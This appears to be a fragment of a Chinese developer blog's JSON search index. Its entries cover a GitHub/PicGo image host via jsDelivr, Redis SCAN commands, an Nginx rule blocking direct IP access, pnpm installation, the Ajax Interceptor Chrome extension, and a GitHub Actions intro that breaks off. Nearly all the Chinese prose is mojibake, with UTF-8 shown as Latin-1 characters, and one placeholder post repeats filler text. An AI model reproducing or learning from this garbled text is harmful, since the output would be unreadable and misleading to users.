åˆ†æ”¯ï¼šé»˜è®¤masterï¼Œä»2020.10.01å¼€å§‹ï¼Œgithubçš„é»˜è®¤åˆ†æ”¯åå˜æ›´ä¸ºmain è®¾å®štokenï¼šç¬¬ä¸€æ­¥åˆ›å»ºçš„token æŒ‡å®šå­˜å‚¨è·¯å¾„ï¼šå¯å¡«å¯ä¸å¡«ã€‚å¡«å†™äº†ï¼Œå›¾ç‰‡å°±ä¼šå­˜å‚¨åœ¨imgæ–‡ä»¶å¤¹ä¸‹ è®¾å®šè‡ªå®šä¹‰åŸŸåï¼šhttps://cdn.jsdelivr.net/gh/[githubç”¨æˆ·å]/[ä»“åº“å]@mainï¼Œæ³¨æ„ï¼Œæ­¤å¤„çš„åˆ†æ”¯ä¸€å®šè¦å¡«å†™@mainï¼Œå¦åˆ™é»˜è®¤ä½¿ç”¨masteråˆ†æ”¯ï¼Œä¼šå‡ºç°å›¾ç‰‡ä¸èƒ½ä¸Šä¼ çš„æƒ…å†µã€‚ã€è¸©å‘ã€‘ è‡³æ­¤ï¼Œgithub+picGoçš„é…ç½®å®Œæˆï¼Œå¯ä»¥åœ¨ä¸Šä¼ åŒºè¿›è¡Œå›¾ç‰‡ä¸Šä¼ ã€‚\n2.å¦‚ä½•ä½¿ç”¨ 2.1 ä½¿ç”¨å›¾åºŠ æ¨¡æ¿ï¼šhttps://cdn.jsdelivr.net/gh/ç”¨æˆ·å/ä»“åº“å@åˆ†æ”¯/å›¾ç‰‡è·¯å¾„\nä¾‹å¦‚ï¼šhttps://cdn.jsdelivr.net/gh/lianpf/image-bed@main/blog/2023/test.png\nåŸgithubçš„è‡ªå®šä¹‰åŸŸåæ˜¯ï¼šhttps://raw.githubusercontent.com/[username]/[ä»“åº“å]ã€‚ä½†è¿™ç§æ–¹å¼è®¿é—®å›¾ç‰‡å·¨æ…¢ï¼Œæ‰€ä»¥æ•™ç¨‹ä¸­ä½¿ç”¨äº†jsdelivrä½œä¸ºcdnåŠ é€Ÿã€‚\næ€»ç»“ å¦‚æœä½ åƒæˆ‘ä¸€æ ·ï¼Œä¸æƒ³ä½¿ç”¨å®¢æˆ·ç«¯ä¸Šä¼ å›¾ç‰‡ï¼Œæˆ–è€…åœ¨å›¾åºŠä»“åº“è®¾ç½®äº†å¤šæ–‡ä»¶å¤¹åˆ†ç±»å›¾ç‰‡ï¼Œé‚£ä½ å¯ä»¥ç›´æ¥é€šè¿‡gitç®¡ç†ä»“åº“ï¼Œé‚£ä¹ˆä½ éœ€è¦åšçš„å°±åªæœ‰ä¸¤æ­¥ã€‚\nåˆ›å»ºã€å›¾åºŠä»“åº“ã€‘ï¼Œä¸Šä¼ å›¾ç‰‡èµ„æºã€‚ ä½¿ç”¨æ¨¡æ¿è·¯å¾„ï¼šhttps://cdn.jsdelivr.net/gh/ç”¨æˆ·å/ä»“åº“å@åˆ†æ”¯/å›¾ç‰‡è·¯å¾„ï¼Œé…ç½®è®¿é—®ä½ çš„å›¾ç‰‡èµ„æºã€‚ å‚è€ƒ ä½¿ç”¨Github+picGoæ­å»ºå›¾åºŠï¼Œä¿å§†çº§æ•™ç¨‹æ¥äº† | çŸ¥ä¹ å¦‚ä½•ä½¿ç”¨GitHubæ­å»ºå›¾åºŠ | å¾®å…¬ä¼— æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/github-image-bed/","summary":"\u003cp\u003eå¯¹äºç»å¸¸å†™ä½œè®°å½•çš„åŒå­¦ï¼Œå›¾åºŠéå¸¸èˆ’æœï¼Œä¸ä»…å¯ä»¥èŠ‚çœå†™ä½œå¯¼å…¥å›¾ç‰‡çš„æ—¶é—´ï¼ŒåŒæ—¶ä¿éšœåšå¥½ä¸€å¼ å›¾çš„æƒ…å†µä¸‹åœ¨å¤šä¸ªæ–‡æ¡£åœºæ™¯ä½¿ç”¨\u0026hellip;\u003c/p\u003e","title":"ImageBed:ä½¿ç”¨GitHubæ­å»ºå›¾åºŠ"},{"content":"1. ä»‹ç» scanå‘½ä»¤çš„ä½œç”¨å’Œkeys *çš„ä½œç”¨ç±»ä¼¼ï¼Œä¸»è¦ç”¨äºæŸ¥æ‰¾redisä¸­çš„é”®ï¼Œä½†æ˜¯åœ¨æ­£å¼çš„ç”Ÿäº§ç¯å¢ƒä¸­ä¸€èˆ¬ä¸ä¼šç›´æ¥ä½¿ç”¨keys *è¿™ä¸ªå‘½ä»¤ï¼Œå› ä¸ºä»–ä¼šè¿”å›æ‰€æœ‰çš„é”®ï¼Œå¦‚æœé”®çš„æ•°é‡å¾ˆå¤šä¼šå¯¼è‡´æŸ¥è¯¢æ—¶é—´å¾ˆé•¿ï¼Œè¿›è€Œå¯¼è‡´æœåŠ¡å™¨é˜»å¡ï¼Œæ‰€ä»¥éœ€è¦scanæ¥è¿›è¡Œæ›´ç»†è‡´çš„æŸ¥æ‰¾\nscanæ€»å…±æœ‰è¿™å‡ ç§å‘½ä»¤ï¼šscanã€sscanã€hscanã€zscanï¼Œåˆ†åˆ«ç”¨äºè¿­ä»£æ•°æ®åº“ä¸­çš„ï¼šæ•°æ®åº“ä¸­æ‰€æœ‰é”®ã€é›†åˆé”®ã€å“ˆå¸Œé”®ã€æœ‰åºé›†åˆé”®ï¼Œå‘½ä»¤å…·ä½“ç»“æ„å¦‚ä¸‹ï¼š\nscan cursor [MATCH pattern] [COUNT count] [TYPE type] sscan key cursor [MATCH pattern] [COUNT count] hscan key cursor [MATCH pattern] [COUNT count] zscan key cursor [MATCH pattern] [COUNT count] 2. scan scan cursor [MATCH pattern] [COUNT count] [TYPE type]ï¼Œcursorè¡¨ç¤ºæ¸¸æ ‡ï¼ŒæŒ‡æŸ¥è¯¢å¼€å§‹çš„ä½ç½®ï¼Œcounté»˜è®¤ä¸º10ï¼ŒæŸ¥è¯¢å®Œåä¼šè¿”å›ä¸‹ä¸€ä¸ªå¼€å§‹çš„æ¸¸æ ‡ï¼Œå½“è¿”å›0çš„æ—¶å€™è¡¨ç¤ºæ‰€æœ‰é”®æŸ¥è¯¢å®Œäº†\n127.0.0.1:6379[2]\u0026gt; scan 0 1) \u0026#34;3\u0026#34; 2) 1) \u0026#34;mystring\u0026#34; 2) \u0026#34;myzadd\u0026#34; 3) \u0026#34;myhset\u0026#34; 4) \u0026#34;mylist\u0026#34; 5) \u0026#34;myset2\u0026#34; 6) \u0026#34;myset1\u0026#34; 7) \u0026#34;mystring1\u0026#34; 8) \u0026#34;mystring3\u0026#34; 9) \u0026#34;mystring4\u0026#34; 10) \u0026#34;myset\u0026#34; 127.0.0.1:6379[2]\u0026gt; scan 3 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;myzadd1\u0026#34; 2) \u0026#34;mystring2\u0026#34; 3) \u0026#34;mylist2\u0026#34; 4) \u0026#34;myhset1\u0026#34; 5) \u0026#34;mylist1\u0026#34; MATCHå¯ä»¥é‡‡ç”¨æ¨¡ç³ŠåŒ¹é…æ‰¾å‡ºè‡ªå·±æƒ³è¦æŸ¥æ‰¾çš„é”®ï¼Œè¿™é‡Œçš„é€»è¾‘æ˜¯å…ˆæŸ¥å‡º20ä¸ªï¼Œå†åŒ¹é…ï¼Œè€Œä¸æ˜¯å…ˆåŒ¹é…å†æŸ¥è¯¢ï¼Œè¿™é‡ŒåŠ ä¸Šcount 20æ˜¯å› ä¸ºé»˜è®¤æŸ¥å‡ºçš„10ä¸ªæ•°ä¸­å¯èƒ½ä¸èƒ½åŒ…å«æ‰€æœ‰çš„ç›¸å…³é¡¹ï¼Œæ‰€ä»¥æŠŠèŒƒå›´æ‰©å¤§åˆ°æŸ¥20ä¸ªï¼Œæˆ‘è¿™é‡Œæµ‹è¯•çš„é”®æ€»å…±æœ‰15ä¸ª\n127.0.0.1:6379[2]\u0026gt; scan 0 match mylist* count 20 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;mylist\u0026#34; 2) \u0026#34;mylist2\u0026#34; 3) \u0026#34;mylist1\u0026#34; TYPEå¯ä»¥æ ¹æ®å…·ä½“çš„ç»“æ„ç±»å‹æ¥åŒ¹é…è¯¥ç±»å‹çš„é”®\n127.0.0.1:6379[2]\u0026gt; scan 0 count 20 type list 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;mylist\u0026#34; 2) \u0026#34;mylist2\u0026#34; 3) \u0026#34;mylist1\u0026#34; 3. sscan sscan key cursor [MATCH pattern] [COUNT count]ï¼Œsscançš„ç¬¬ä¸€ä¸ªå‚æ•°æ€»æ˜¯é›†åˆç±»å‹çš„key\n127.0.0.1:6379[2]\u0026gt; sadd myset1 a b c d (integer) 4 127.0.0.1:6379[2]\u0026gt; smembers myset1 1) \u0026#34;d\u0026#34; 2) \u0026#34;a\u0026#34; 3) \u0026#34;c\u0026#34; 4) \u0026#34;b\u0026#34; 127.0.0.1:6379[2]\u0026gt; sscan myset1 0 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;d\u0026#34; 2) \u0026#34;c\u0026#34; 3) \u0026#34;b\u0026#34; 4) \u0026#34;a\u0026#34; 127.0.0.1:6379[2]\u0026gt; sscan myset1 0 match a 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;a\u0026#34; 4. hscan hscan key cursor [MATCH pattern] [COUNT count]ï¼Œsscançš„ç¬¬ä¸€ä¸ªå‚æ•°æ€»æ˜¯å“ˆå¸Œç±»å‹çš„key\n127.0.0.1:6379[2]\u0026gt; hset myhset1 kk1 vv1 kk2 vv2 kk3 vv3 (integer) 3 127.0.0.1:6379[2]\u0026gt; hgetall myhset1 1) \u0026#34;kk1\u0026#34; 2) \u0026#34;vv1\u0026#34; 3) \u0026#34;kk2\u0026#34; 4) \u0026#34;vv2\u0026#34; 5) \u0026#34;kk3\u0026#34; 6) \u0026#34;vv3\u0026#34; 127.0.0.1:6379[2]\u0026gt; hscan myhset1 0 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;kk1\u0026#34; 2) \u0026#34;vv1\u0026#34; 3) \u0026#34;kk2\u0026#34; 4) \u0026#34;vv2\u0026#34; 5) \u0026#34;kk3\u0026#34; 6) \u0026#34;vv3\u0026#34; 5. zscan zscan key cursor [MATCH pattern] [COUNT count]ï¼Œsscançš„ç¬¬ä¸€ä¸ªå‚æ•°æ€»æ˜¯æœ‰åºé›†åˆç±»å‹çš„key\n127.0.0.1:6379[2]\u0026gt; zadd myzadd1 1 zz1 2 zz2 3 zz3 (integer) 3 127.0.0.1:6379[2]\u0026gt; zrange myzadd1 0 -1 withscores 1) \u0026#34;zz1\u0026#34; 2) \u0026#34;1\u0026#34; 3) \u0026#34;zz2\u0026#34; 4) \u0026#34;2\u0026#34; 5) \u0026#34;zz3\u0026#34; 6) \u0026#34;3\u0026#34; 127.0.0.1:6379[2]\u0026gt; zscan myzadd1 0 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;zz1\u0026#34; 2) \u0026#34;1\u0026#34; 3) \u0026#34;zz2\u0026#34; 4) \u0026#34;2\u0026#34; 5) \u0026#34;zz3\u0026#34; 6) \u0026#34;3\u0026#34; ","permalink":"https://lianpf.github.io/posts/tech/tech1/","summary":"1. ä»‹ç» scanå‘½ä»¤çš„ä½œç”¨å’Œkeys *çš„ä½œç”¨ç±»ä¼¼ï¼Œä¸»è¦ç”¨äºæŸ¥æ‰¾","title":"Redis scanå‘½ä»¤å­¦ä¹ "},{"content":"ä¸€äº›GitHubä¸Šæˆ–Giteeå€¼å¾—å…³æ³¨çš„å¼€æºé¡¹ç›®æˆ–ç»„ç»‡\u0026hellip;\nä¸€ã€ç»„ç»‡ Google Google | GitHub è…¾è®¯ è…¾è®¯AlloyTeam - webå‰ç«¯å›¢é˜Ÿ | GitHub ç™¾åº¦ Baidu Baidu FEX team - å‰ç«¯å›¢é˜Ÿ | GitHub é˜¿é‡Œç³» é¥¿äº†ä¹ˆ é¥¿äº†ä¹ˆå‰ç«¯ ä¸­é€šå¿«é€’ ZTO-Express | GitHub äºŒã€æ˜æ˜Ÿé¡¹ç›® 1.åç«¯è§†è§’ 2.å‰ç«¯è§†è§’ Reactç›¸å…³ react-componentï¼šåŸºäºreactçš„ç»„ä»¶ styled-componentsï¼šcss-in-jsã€React Demoç¤ºä¾‹ react-pxq: react16 + redux çš„å®Œæ•´é¡¹ç›®ï¼ˆåŸºäºç”Ÿå‘½å‘¨æœŸå’ŒClass Componentï¼‰ æ•°æ®å¯è§†åŒ– ThreeJS CSS classnames Webpackç›¸å…³ webpack-contrib: webpack loaderã€pluginç­‰ webpack-bundle-analyzer: analyzeã€bundle è·¨ç«¯ taro: å¤šç«¯ç»Ÿä¸€å¼€å‘æ¡†æ¶ã€React æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/github-star-project-and-org/","summary":"\u003cp\u003eä¸€äº›\u003ccode\u003eGitHubä¸Š\u003c/code\u003eæˆ–\u003ccode\u003eGitee\u003c/code\u003eå€¼å¾—å…³æ³¨çš„å¼€æºé¡¹ç›®æˆ–ç»„ç»‡\u0026hellip;\u003c/p\u003e","title":"GitHubå’ŒGiteeæ˜æ˜Ÿé¡¹ç›®åŠç»„ç»‡"},{"content":"Nginxä¸­å¸¸ç”¨çš„é…ç½®è®°å½•\u0026hellip;\nä¸€ã€åªå…è®¸åŸŸåè®¿é—®ç¦æ­¢ipè®¿é—® å‚è€ƒï¼šNginxåªå…è®¸åŸŸåè®¿é—®ç¦æ­¢ipè®¿é—®\né…ç½®Nginxåªå…è®¸åŸŸåè®¿é—®è€Œç¦æ­¢IPè®¿é—®ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹é…ç½®:\n# ç¬¬ä¸€ä¸ªserverä¸­é…ç½®å…è®¸è®¿é—®çš„åŸŸåï¼Œå³example.com # åœ¨location / ä¸­ï¼Œå¯ä»¥é…ç½®å½“å‰ç½‘ç«™çš„å…·ä½“å†…å®¹å’Œé…ç½® server { listen 80; server_name example.com; # é…ç½®åŸŸåè®¿é—® location / { # your website configuration } } # ç¦æ­¢ IP è®¿é—® # ç¬¬äºŒä¸ªserveræ˜¯é»˜è®¤çš„è™šæ‹Ÿä¸»æœºï¼Œç›‘å¬æ‰€æœ‰æ²¡æœ‰åœ¨å…¶ä»–è™šæ‹Ÿä¸»æœºä¸­å®šä¹‰çš„è¯·æ±‚ # é€šè¿‡ server_name _ æŒ‡å®šè¯¥è™šæ‹Ÿä¸»æœºåº”è¯¥å¤„ç†æ‰€æœ‰æ²¡æœ‰åŒ¹é…åˆ°å…¶ä»–è™šæ‹Ÿä¸»æœºçš„è¯·æ±‚ server { listen 80 default_server; server_name _; deny all; # é€šè¿‡deny allæŒ‡ä»¤ç¦æ­¢æ‰€æœ‰è¯·æ±‚ï¼ŒåŒ…æ‹¬IPè®¿é—®å’ŒåŸŸåè®¿é—® # è¿™æ ·ï¼Œåªæœ‰åœ¨ç¬¬ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸­é…ç½®çš„åŸŸåæ‰èƒ½è¢«è®¿é—®ï¼Œè€ŒIPè®¿é—®å°†è¢«ç¦æ­¢ } æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/nginx-commonconf/","summary":"\u003cp\u003e\u003ccode\u003eNginx\u003c/code\u003eä¸­å¸¸ç”¨çš„é…ç½®è®°å½•\u0026hellip;\u003c/p\u003e","title":"Nginx: Common Confï¼ˆåœºæ™¯åŒ–å¸¸ç”¨é…ç½®ï¼‰"},{"content":"éšç€é¡¹ç›®çš„å¢å¤šï¼Œä¾èµ–é¡¹ä¸é¡¹ç›®çš„æ•°é‡æˆæ­£æ¯”ã€‚ä½¿ç”¨pnpmåœ¨ç£ç›˜ä¸ŠèŠ‚çœå¤§é‡ç©ºé—´ï¼Œä¸”å®‰è£…é€Ÿåº¦è¦å¿«å¾—å¤š\u0026hellip;\nèƒŒæ™¯ å½“ä½¿ç”¨ npm æˆ– Yarn æ—¶ï¼Œå¦‚æœä½ æœ‰ 100 ä¸ªé¡¹ç›®ä½¿ç”¨äº†æŸä¸ªä¾èµ–ï¼ˆdependencyï¼‰ï¼Œå°±ä¼šæœ‰ 100 ä»½è¯¥ä¾èµ–çš„å‰¯æœ¬ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚ è€Œåœ¨ä½¿ç”¨ pnpm æ—¶ï¼Œä¾èµ–ä¼šè¢«å­˜å‚¨åœ¨å†…å®¹å¯å¯»å€çš„å­˜å‚¨ä¸­ï¼Œæ‰€ä»¥ï¼š\nå¦‚æœä½ ç”¨åˆ°äº†æŸä¾èµ–é¡¹çš„ä¸åŒç‰ˆæœ¬ï¼Œåªä¼šå°†ä¸åŒç‰ˆæœ¬é—´æœ‰å·®å¼‚çš„æ–‡ä»¶æ·»åŠ åˆ°ä»“åº“ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæŸä¸ªåŒ…æœ‰100ä¸ªæ–‡ä»¶ï¼Œè€Œå®ƒçš„æ–°ç‰ˆæœ¬åªæ”¹å˜äº†å…¶ä¸­1ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆ pnpm update æ—¶åªä¼šå‘å­˜å‚¨ä¸­å¿ƒé¢å¤–æ·»åŠ 1ä¸ªæ–°æ–‡ä»¶ï¼Œè€Œä¸ä¼šå› ä¸ºä»…ä»…ä¸€ä¸ªæ–‡ä»¶çš„æ”¹å˜å¤åˆ¶æ•´æ–°ç‰ˆæœ¬åŒ…çš„å†…å®¹ã€‚ æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šå­˜å‚¨åœ¨ç¡¬ç›˜ä¸Šçš„æŸä¸€ä½ç½®ã€‚ å½“è½¯ä»¶åŒ…è¢«è¢«å®‰è£…æ—¶ï¼ŒåŒ…é‡Œçš„æ–‡ä»¶ä¼šç¡¬é“¾æ¥åˆ°è¿™ä¸€ä½ç½®ï¼Œè€Œä¸ä¼šå ç”¨é¢å¤–çš„ç£ç›˜ç©ºé—´ã€‚ è¿™å…è®¸ä½ è·¨é¡¹ç›®åœ°å…±äº«åŒä¸€ç‰ˆæœ¬çš„ä¾èµ–ã€‚ å› æ­¤ï¼Œæ‚¨åœ¨ç£ç›˜ä¸ŠèŠ‚çœäº†å¤§é‡ç©ºé—´ï¼Œè¿™ä¸é¡¹ç›®å’Œä¾èµ–é¡¹çš„æ•°é‡æˆæ­£æ¯”ï¼Œå¹¶ä¸”å®‰è£…é€Ÿåº¦è¦å¿«å¾—å¤šï¼\nä¸€ã€åŸºç¡€ç”¨æ³• 1.å®‰è£… // é€šè¿‡ npm å®‰è£… npm install -g pnpm // å¦‚æœæ‚¨å®‰è£…äº†åŒ…ç®¡ç†å™¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£… pnpm brew install pnpm äºŒã€å…¶ä»– å¾…è¡¥å……\u0026hellip;\nå‚è€ƒ pnpm å®˜æ–¹æ–‡æ¡£ è½¬è½¬çš„CIç³»ç»Ÿå’Œå¼€å‘ç¯å¢ƒä¸ºä»€ä¹ˆè¦ä»npmåˆ‡æ¢åˆ°pnpm æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/npm-package-pnpm/","summary":"\u003cp\u003eéšç€é¡¹ç›®çš„å¢å¤šï¼Œä¾èµ–é¡¹ä¸é¡¹ç›®çš„æ•°é‡æˆæ­£æ¯”ã€‚ä½¿ç”¨\u003ccode\u003epnpm\u003c/code\u003eåœ¨ç£ç›˜ä¸ŠèŠ‚çœå¤§é‡ç©ºé—´ï¼Œä¸”å®‰è£…é€Ÿåº¦è¦å¿«å¾—å¤š\u0026hellip;\u003c/p\u003e","title":"Node: npmåŒ…ç®¡ç†ä¹‹pnpm"},{"content":"ä¸€ä¸ªç”¨äºä¿®æ”¹ajaxè¯·æ±‚å“åº”çš„chromeæ‰©å±•\u0026hellip;\nAjax Interceptoræ˜¯ä¸€ä¸ªç”¨äºä¿®æ”¹ajaxè¯·æ±‚å“åº”çš„chromeæ‰©å±•ï¼ŒMockä¿®æ”¹ajaxè¯·æ±‚çš„è¿”å›ç»“æœã€‚\nä¸€ã€èƒŒæ™¯å’Œå®‰è£… ä½¿ç”¨èƒŒæ™¯ï¼š\næœåŠ¡ç«¯æ•°æ®ä¸ç¬¦åˆé¢„æœŸï¼Œç®€å•Mockï¼Œæµ‹è¯•ä¸€äº›è¾¹ç•Œå€¼ å¤ç°Bugï¼Œå¿«é€Ÿå®šä½é—®é¢˜ å®‰è£…ï¼š\nChromeåº”ç”¨å•†åº—ä¸­æœç´¢Ajax Interceptor ä¼ é€é—¨ äºŒã€ä½¿ç”¨ ç¬¬ä¸€æ­¥ï¼šåœ¨æ‰©å±•ç¨‹åºä¸­æ‰“å¼€Ajax Interceptor\nç‚¹å‡»ä¸Šå›¾çº¢è‰²å•†åº—icon æ‰“å¼€ç»¿è‰²Ajax Interceptoråº”ç”¨æ ‡è¯† ç¬¬äºŒæ­¥ï¼šæ›¿æ¢requestè¯·æ±‚å“åº”å†…å®¹\nç‚¹å‡»æ‰©å±•ç¨‹åºAjax Interceptoræ ‡è¯†ï¼Œå¼¹å‡ºå¦‚ä¸‹æ“ä½œç•Œé¢ï¼š é…ç½®æ‹¦æˆªçš„urlæˆ–url æ­£åˆ™ å°†é“¾æ¥çš„å“åº”å†…å®¹ç²˜è´´å…¥Replace Withä¸­ï¼Œè¿›è¡Œä¿®æ”¹ç¼–è¾‘ï¼ˆå¯ç‚¹å‡»JSON Editorä¿®æ”¹æ•°æ®ï¼‰ ä¿å­˜ åˆ·æ–°é¡µé¢ï¼ŒæŸ¥çœ‹æ•ˆæœ ä¸‰ã€å…¶ä»–åº”ç”¨: Ajax Proxy Ajax Proxy: https://blog.csdn.net/wl18271672781/article/details/125432559\nå‚è€ƒ Ajax Interceptorä½¿ç”¨ å®˜æ–¹è§†é¢‘æ•™ç¨‹ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/09.ajax-interceptor/","summary":"\u003cp\u003eä¸€ä¸ªç”¨äºä¿®æ”¹\u003ccode\u003eajax\u003c/code\u003eè¯·æ±‚å“åº”çš„\u003ccode\u003echrome\u003c/code\u003eæ‰©å±•\u0026hellip;\u003c/p\u003e","title":"æŠ“åŒ…å·¥å…·: Ajax Interceptorï¼ˆAjax æ‹¦æˆªï¼‰"},{"content":"\u0026lt;div\u0026gt; ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  ç§‘æŠ€ä»£ç  \u0026lt;/div\u0026gt; ","permalink":"https://lianpf.github.io/posts/tech/tech/","summary":"\u0026lt;div\u0026gt; ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘æŠ€ä»£ç ç§‘","title":"Tech"},{"content":"æŒç»­é›†æˆç”±å¾ˆå¤šæ“ä½œç»„æˆï¼Œæ¯”å¦‚æŠ“å–ä»£ç ã€è¿è¡Œæµ‹è¯•ã€ç™»å½•è¿œç¨‹æœåŠ¡å™¨ï¼Œå‘å¸ƒåˆ°ç¬¬ä¸‰æ–¹æœåŠ¡ç­‰ç­‰ã€‚GitHubæŠŠè¿™äº›æ“ä½œå°±ç§°ä¸ºactions\u0026hellip;\nä¸€ã€GitHub Actionsä»‹ç»åŠä½¿ç”¨ 1.åŸºæœ¬æ¦‚å¿µ GitHub Actionsçš„æœ¯è¯­ï¼š\nworkflowï¼ˆå·¥ä½œæµç¨‹ï¼‰ï¼šæŒç»­é›†æˆä¸€æ¬¡è¿è¡Œçš„è¿‡ç¨‹ï¼Œå°±æ˜¯ä¸€ä¸ªworkflow 